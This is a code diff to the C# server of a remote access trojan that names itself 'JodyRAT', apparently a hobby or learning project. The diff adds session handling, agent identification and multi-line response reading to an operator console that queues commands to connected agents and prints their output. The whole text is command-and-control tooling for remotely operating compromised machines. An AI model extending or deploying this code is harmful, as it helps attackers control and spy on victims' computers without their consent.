@@ -4,12 +4,14 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Collections.Generic;
 using System.Text;
+using System.IO;
 
 /// <summary> Holds global configuration constants for the application </summary>
 class ServerConstants{
     public const string SERVER_HOST = "127.0.0.1";
     public const int SERVER_PORT = 8000;
     public const string PROMPT = "JodyRAT> ";
+    public const string EOF = "<<<<EOF>>>>";
 }
 
 /// <summary> The main Server class. Responsible for creating the main listener as well as a ClientHandler for each agent</summary>
@@ -35,9 +37,21 @@ class Server {
             string[] UserInputTokens = UserInput.Split(' ');            
             switch(UserInputTokens[0].ToLower()){
                 case "quit":
-                    KeepGoing = false;
-                    foreach(ClientHandler client in ClientList){
-                        client.SendClientCommand("quit");
+                    if(CurrentSession == -1){  // At main menu: Send quit to all agents and exit server
+                        Log("Quitting all Sessions");
+                        KeepGoing = false;
+                        foreach(ClientHandler client in ClientList){
+                            client.SendClientCommand("quit");
+                            client.Stop();
+                        }
+                        Thread.Sleep(1000); // Ensure each ClientHandler thread has a chance to send the message before program exits.
+                    }else{                  // In session menu: Send quit to selected session, remove from list, and reset to main menu.
+                        Log("Quitting Session " + CurrentSession);
+                        ClientList[CurrentSession].SendClientCommand("quit");
+                        ClientList[CurrentSession].Stop();
+                        ClientList.RemoveAt(CurrentSession);
+                        CurrentSession = -1;
+                        Prompt = ServerConstants.PROMPT;
                     }
                 break;
                 case "back":
@@ -46,15 +60,18 @@ class Server {
                 break;
                 case "list":
                     for(int ctr = 0; ctr < ClientList.Count; ctr++){
-                        Console.WriteLine(ctr);                        
+                        Console.WriteLine(ctr + ") " + ClientList[ctr].Identify());
                     }
                 break;
                 case "enter":
                     try{
                         string SessionID = UserInputTokens[1];
-                        CurrentSession = Int16.Parse(SessionID);
-                        Console.WriteLine("Entering session " + SessionID);
-                        Prompt = String.Format("{0}({1}) ",ServerConstants.PROMPT, CurrentSession);
+                        int SpecifiedSession = Int32.Parse(SessionID);
+                        if(ClientList.Count > SpecifiedSession){
+                            CurrentSession = SpecifiedSession;
+                            Console.WriteLine("Entering session " + CurrentSession);                            
+                            Prompt = String.Format("{0}({1}) ",ServerConstants.PROMPT, CurrentSession);
+                        }
                     }catch(Exception){
                         CurrentSession = -1;
                         Prompt = ServerConstants.PROMPT;
@@ -100,7 +117,7 @@ class Server {
     }
 
     public static void ClientResponse(string s){
-        Console.WriteLine("\n");
+        Console.WriteLine();
         Console.WriteLine(s);        
     }
 
@@ -166,10 +183,12 @@ class ClientHandler {
     private TcpClient Client;
     private Queue<string> NextCmds;
     private bool Active;
+    private string Identity;
 
     public void Start(TcpClient c){
         Server.Log("Starting ClientHandler Thread");        
         Active = true;
+        Identity = "";
         Client = c;
         NextCmds = new Queue<string>();
         Thread CThread = new Thread(HandleClient);
@@ -177,11 +196,24 @@ class ClientHandler {
     }
 
     public void Stop(){
+        Thread.Sleep(1000);     // Brief pause to allow any remaining commands to be sent before shutting down
         Active = false;
     }
 
     public void SendClientCommand(string cmd){
         NextCmds.Enqueue(cmd);
+    }
+
+    public string Identify(){
+        if (Identity == ""){
+            NetworkStream Stream = Client.GetStream();
+            StreamReader Reader = new StreamReader(Stream);
+            StreamWriter Writer = new StreamWriter(Stream);
+            Writer.WriteLine("identify");
+            Writer.Flush();
+            Identity = Reader.ReadLine();
+        }
+        return Identity;        
     }
 
     private void HandleClient(){
@@ -191,19 +223,22 @@ class ClientHandler {
             }
             if(NextCmds.Count > 0){
                 // Send command
-                NetworkStream stream = Client.GetStream();
+                NetworkStream Stream = Client.GetStream();
+                StreamReader Reader = new StreamReader(Stream);
+                StreamWriter Writer = new StreamWriter(Stream);
                 string NextCmd = NextCmds.Dequeue();
-                byte[] Bytes = Encoding.ASCII.GetBytes(NextCmd);
-                stream.Write(Bytes, 0, Bytes.Length);
-                stream.Flush();
+                Writer.WriteLine(NextCmd);
+                Writer.Flush();
 
                 // Receive response
-                Bytes = new byte[Client.ReceiveBufferSize];
-                int BytesLen = stream.Read(Bytes,0,Client.ReceiveBufferSize);
-                string Result = Encoding.ASCII.GetString(Bytes,0,BytesLen);
+                string line;
+                string Result = "";
+                while((line = Reader.ReadLine()) != ServerConstants.EOF){
+                    Result += line + "\n";  
+                }
                 Server.ClientResponse(Result);
-            }   
-            Thread.Sleep(50);
+            }
+            Thread.Sleep(5);
         }
     }
 }
